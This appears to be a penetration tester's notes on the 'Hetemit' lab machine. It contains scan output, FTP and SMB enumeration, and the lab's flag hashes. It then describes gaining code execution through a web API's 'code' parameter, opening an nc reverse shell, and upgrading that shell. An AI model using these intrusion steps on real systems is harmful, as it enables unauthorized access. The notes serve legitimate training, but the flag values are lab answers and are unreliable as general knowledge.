**Metadata**

- IP Address:  192.168.162.117
- Hostname: 
- OS: 	Linux/CentOS
- Found Credentials/Users:
cmeeks

Main Objectives:

Local.txt = 7a0ad2df28544b75524ee4f20ebe4f4d
Proof.txt = a8b6164973f2fde7d11bfed46430b201

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.162.117 -oN - 
# Nmap 7.95 scan initiated Tue Jan 13 15:32:59 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.162.117
Nmap scan report for 192.168.162.117
Host is up (0.085s latency).
Not shown: 994 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

# Nmap done at Tue Jan 13 15:33:06 2026 -- 1 IP address (1 host up) scanned in 7.63 seconds
[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.162.117 -oN /home/kali/ProvingGround/Hetemit/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Hetemit/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 15:33 MST
Nmap scan report for 192.168.162.117
Host is up (0.082s latency).
Not shown: 65528 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
18000/tcp open  biimenu?
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port18000-TCP:V=7.95%I=9%D=1/13%Time=6966C8BF%P=x86_64-unknown-linux-gn
SF:u%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Get
SF:Request,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/htm
SF:l;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x2
SF:0/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title
SF:>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20
SF:background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\
SF:n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20
SF:\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20f
SF:ont-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x2
SF:0\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20l
SF:ine-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x
SF:20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20whit
SF:e-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x2
SF:0{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\
SF:x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200p
SF:x;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20
SF:\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x
SF:20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20
SF:padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\
SF:x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20
SF:\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x20
SF:2em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x2
SF:0\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\
SF:n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\
SF:x20\x20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nConte
SF:nt-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\
SF:r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20
SF:charset=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Except
SF:ion\x20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20
SF:\x20\x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20
SF:\x20color:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\
SF:x20\x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\
SF:x20\x20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20
SF:sans-serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\
SF:x20\x20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20
SF:\x20\x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20
SF:\x20\x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x2
SF:0\x20\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid
SF:\x20#EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\
SF:x20\x20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\
SF:x20\x20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20co
SF:lor:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20
SF:\x20\x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\
SF:n\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x20
SF:0;\n\x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x
SF:20\x20font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\
SF:n\x20\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20li
SF:ne-height:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20
SF:{\n\x20\x20\x20\x20\x20\x20bord");
Service Info: OS: Unix

[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.162.117 -oN /home/kali/ProvingGround/Hetemit/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/Hetemit/nmap/medium_udp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 15:36 MST
Nmap scan report for 192.168.162.117
Host is up.
Skipping host 192.168.162.117 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1205.12 seconds


```

2. Interesting Ports/Services

```

```

3. FTP Enumeration

```

FTP (21/tcp) Enumeration & Exploitation – OSCP Cheat Sheet

Metadata
IP: 192.168.162.117 
Service: vsftp 
Version: 3.0.3

1. Initial Detection

nmap -p 21 -sS --open <IP>

Confirm FTP is open and responding.

---

2. Banner & Version Enumeration

21/tcp    open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.151
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)

* FTP server type (vsftpd, ProFTPD, Pure-FTPd, FileZilla)
* Exact version numbers
* Anonymous login hints

---

3. Anonymous Login Test (ALWAYS)

ftp 192.168.162.117

Credentials to try:

Username: anonymous
Password: anonymous

Connected to 192.168.162.117.
220 (vsFTPd 3.0.3)
Name (192.168.162.117:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

or any password

After login:

ftp> pwd
Remote directory: /
ftp> binary
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||40208|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.

---

4. Anonymous Upload Test

Create a test file:

echo test > test.txt

Upload:

ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||51371|)

ftp> put test.txt
local: test.txt remote: test.txt
200 EPRT command successful. Consider using EPSV.
553 Could not create file.

ftp> prompt 
Interactive mode off.
ftp> mget *
ftp: Can't connect to `192.168.162.117:23044': Connection timed out

If upload succeeds:

* Check if directory maps to web root
* Attempt webshell upload
* Look for cron/script abuse

---

5. Download Everything (Loot First)

From local machine:

wget -r ftp://anonymous:anonymous@192.168.162.117

--2026-01-13 17:08:37--  ftp://anonymous:*password*@192.168.162.117/
           => ‘192.168.162.117/.listing’
Connecting to 192.168.162.117:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... 
couldn't connect to 192.168.162.117 port 30189: Connection timed out
Retrying.

From ftp client:

prompt
mget *

Look for:

* Credentials
* .bak / .old / .zip / .tar.gz
* Source code
```

4. SSH Enumeration

```
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
```

4. Web Enumeration 

```
Server: Apache/2.4.37 (centos)

Site Visit: Looks like an apache web server test page. Says server is Centos. 

Other Observations:

80/tcp    open  http        Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
| http-methods: 
|_  Potentially risky methods: TRACE

[+] Nikto scan on HTTP ports: 80,50000
[+] Running: Nikto (80)
[+] Command: nikto -h http://192.168.162.117:80 -output /home/kali/ProvingGround/Hetemit/web/192.168.162.117_80/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.117
+ Target Hostname:    192.168.162.117
+ Target Port:        80
+ Start Time:         2026-01-13 16:20:05 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'tcn' found, with contents: choice.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.37 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8908 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2026-01-13 16:32:15 (GMT-7) (730 seconds)
 
[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.162.117:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Hetemit/gobuster/Hetemit_192.168.162.117_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.117:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 218]
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/cgi-bin/             (Status: 403) [Size: 217]
/noindex              (Status: 301) [Size: 239] [--> http://192.168.162.117/noindex/]
Progress: 4451 / 4613 (96.49%)
===============================================================
Finished

[+] Running: Gobuster ADVANCED (80)
[+] Command: gobuster dir -u http://192.168.162.117:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Hetemit/gobuster/Hetemit_192.168.162.117_80_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.117:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 26180 / 220559 (11.87%)gobuster dir -u http://192.168.101.110 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
Progress: 220558 / 220558 (100.00%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished

[+] Running: Gobuster FILE search (80)
[+] Command: gobuster dir -u http://192.168.162.117:80 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Hetemit/gobuster/Hetemit_192.168.162.117_80_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.117:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              aspx,jsp,bak,old,zip,tar,html,txt,tar.gz,php,asp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode

/noindex              (Status: 301) [Size: 239] [--> http://192.168.162.117/noindex/]
Progress: 55302 / 55356 (99.90%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished

[+] Running: Gobuster LOWERCASE dir (80)
[+] Command: gobuster dir -u http://192.168.162.117:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Hetemit/gobuster/Hetemit_192.168.162.117_80_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.117:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 207582 / 207641 (99.97%)
===============================================================
Finished


```

6. SMB Port 139, 445 Enumeration

```
39/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4

smbclient -L //192.168.162.117
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Cmeeks          Disk      cmeeks Files
        IPC$            IPC       IPC Service (Samba 4.11.2)

smbclient -L //192.168.162.117/Cmeeks -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Cmeeks          Disk      cmeeks Files
        IPC$            IPC       IPC Service (Samba 4.11.2)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.162.117 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

smbmap -H 192.168.162.117         
[+] IP: 192.168.162.117:445     Name: 192.168.162.117           Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Cmeeks                                                  NO ACCESS       cmeeks Files
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.11.2)
      

```

7. Port 18000

```
Url: http://192.168.162.117:18000/
Server:
Site Visit: 
	- Protomba Site. 
	- Login site. http://192.168.162.117:18000/login
	- Registration site. http://192.168.162.117:18000/users/new
	- Profile pic upload possible on registration site. 
	
gobuster dir -u http://192.168.162.117 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
2026/01/13 18:42:52 wordlist file "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" does not exist: stat /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt: no such file or directory
                                                                                                                    
┌──(kali㉿Kali)-[~/scripts/pg_recon]
└─$ gobuster dir -u http://192.168.162.117 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.117
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================


18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
```

8. Port 50000

```
Server: Werkzeug/1.0.1 Python/3.6.8

[+] Running: Nikto (50000)
[+] Command: nikto -h http://192.168.162.117:50000 -output /home/kali/ProvingGround/Hetemit/web/192.168.162.117_50000/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.117
+ Target Hostname:    192.168.162.117
+ Target Port:        50000
+ Start Time:         2026-01-13 17:49:53 (GMT-7)
---------------------------------------------------------------------------
+ Server: Werkzeug/1.0.1 Python/3.6.8
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Python/3.6.8 appears to be outdated (current is at least 3.9.6).
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS .
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2026-01-13 18:10:11 (GMT-7) (1218 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
1 service unrecognized despite returning data. If you know the service/version, 

[+] Command: gobuster dir -u http://192.168.162.117:50000 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Hetemit/gobuster/Hetemit_192.168.162.117_50000_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.117:50000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4175 / 4613 (90.51%)[ERROR] error on word lang-en: timeout occurred during the request
[ERROR] error on word lang-fr: timeout occurred during the request
[ERROR] error on word languages: timeout occurred during the request
[ERROR] error on word large: timeout occurred during the request
[ERROR] error on word lat_getlinking: timeout occurred during the request
[ERROR] error on word lat_driver: timeout occurred during the request
Progress: 4597 / 4613 (99.65%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished

[+] Running: Gobuster ADVANCED (50000)
[+] Command: gobuster dir -u http://192.168.162.117:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Hetemit/gobuster/Hetemit_192.168.162.117_50000_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.117:50000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/verify               (Status: 200) [Size: 8]
/generate             (Status: 200) [Size: 16]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished

[+] Running: Gobuster FILE search (50000)
[+] Command: gobuster dir -u http://192.168.162.117:50000 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Hetemit/gobuster/Hetemit_192.168.162.117_50000_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.117:50000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              asp,txt,bak,old,zip,tar,tar.gz,php,aspx,jsp,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 55295 / 55356 (99.89%)
===============================================================
Finished

[+] Command: gobuster dir -u http://192.168.162.117:50000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Hetemit/gobuster/Hetemit_192.168.162.117_50000_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.117:50000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/verify               (Status: 200) [Size: 8]
/generate             (Status: 200) [Size: 16]
Progress: 207534 / 207641 (99.95%)
Progress: 207641 / 207641 (100.00%)===============================================================
Finished




```

8. Possible Exploits

```
1. https://www.exploit-db.com/exploits/43905
2. Maybe cmeeks is a username and can be cracked. 
3. Something with Ruby on Rails -U
4. API http://192.168.162.117:50000/{/verify, /generate}
   
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

2. Found that the API at http://192.168.162.117:50000/ was exploitable.
3. Using the API url http://192.168.162.117:50000/ and sending a post with a value in the 'code' variable you can execute code.
   ![[Pasted image 20260115144709.png]]

4. Set nc listener on 18000. 
	![[Pasted image 20260115144842.png]]
 
 5. Executed reverse shell using nc. 
	 ![[Pasted image 20260115145003.png]]

6.  Received reverse shell as cmeeks.
	![[Pasted image 20260115145202.png]]
	
7. Shell Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

export TERM=xterm

export SHELL=/bin/bash

Ctrl+Z

stty raw -echo; fg

reset
```

**Post-Exploitation**

1. Identify & System Info

```
[+] whoami
$ whoami
cmeeks

[+] id
$ id
uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)

[+] hostname
$ hostname
hetemit

[+] pwd
$ pwd
/home/cmeeks

[+] uname -a
$ uname -a
Linux hetemit 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

[+] os-release / issue
$ cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
NAME="CentOS Linux"
VERSION="8 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="8"
PLATFORM_ID="platform:el8"
PRETTY_NAME="CentOS Linux 8 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:8"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-8"
CENTOS_MANTISBT_PROJECT_VERSION="8"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="8"



```

2. Environment

```

[+] env
$ env
LS_COLORS=
_=/usr/bin/env
LANG=en_US.UTF-8
rvm_bin_path=/home/cmeeks/.rvm/bin
OLDPWD=/home/cmeeks/restjson_hetemit
INVOCATION_ID=b72246649656455fbcec4b6780413a77
rvm_version=1.29.10 (latest)
RUBY_VERSION=ruby-2.6.3
GEM_HOME=/home/cmeeks/.rvm/gems/ruby-2.6.3
USER=cmeeks
NCAT_REMOTE_ADDR=192.168.45.151
PWD=/home/cmeeks
HOME=/home/cmeeks
JOURNAL_STREAM=9:25046
NCAT_REMOTE_PORT=18000
GEM_PATH=/home/cmeeks/.rvm/gems/ruby-2.6.3:/home/cmeeks/.rvm/gems/ruby-2.6.3@global
NCAT_LOCAL_PORT=46940
rvm_path=/home/cmeeks/.rvm
SHELL=/bin/bash
rvm_prefix=/home/cmeeks
SHLVL=5
LOGNAME=cmeeks
MY_RUBY_HOME=/home/cmeeks/.rvm/rubies/ruby-2.6.3
PATH=/home/cmeeks/.rvm/gems/ruby-2.6.3/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3@global/bin:/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin:/home/cmeeks/.local/bin:/home/cmeeks/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin
NCAT_LOCAL_ADDR=192.168.162.117
IRBRC=/home/cmeeks/.rvm/rubies/ruby-2.6.3/.irbrc
NCAT_PROTO=TCP
FLASK_RUN_FROM_CLI=true
LESSOPEN=||/usr/bin/lesspipe.sh %s

[+] set (first 50)
$ set 2>/dev/null | head -n 50
BASH=/usr/bin/bash
BASHOPTS=cmdhist:complete_fullquote:extquote:force_fignore:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=()
BASH_ARGV=()
BASH_CMDS=()
BASH_EXECUTION_STRING='set 2>/dev/null | head -n 50'
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="4" [1]="4" [2]="19" [3]="1" [4]="release" [5]="x86_64-redhat-linux-gnu")
BASH_VERSION='4.4.19(1)-release'
DIRSTACK=()
EUID=1000
FLASK_RUN_FROM_CLI=true
GEM_HOME=/home/cmeeks/.rvm/gems/ruby-2.6.3
GEM_PATH=/home/cmeeks/.rvm/gems/ruby-2.6.3:/home/cmeeks/.rvm/gems/ruby-2.6.3@global
GROUPS=()
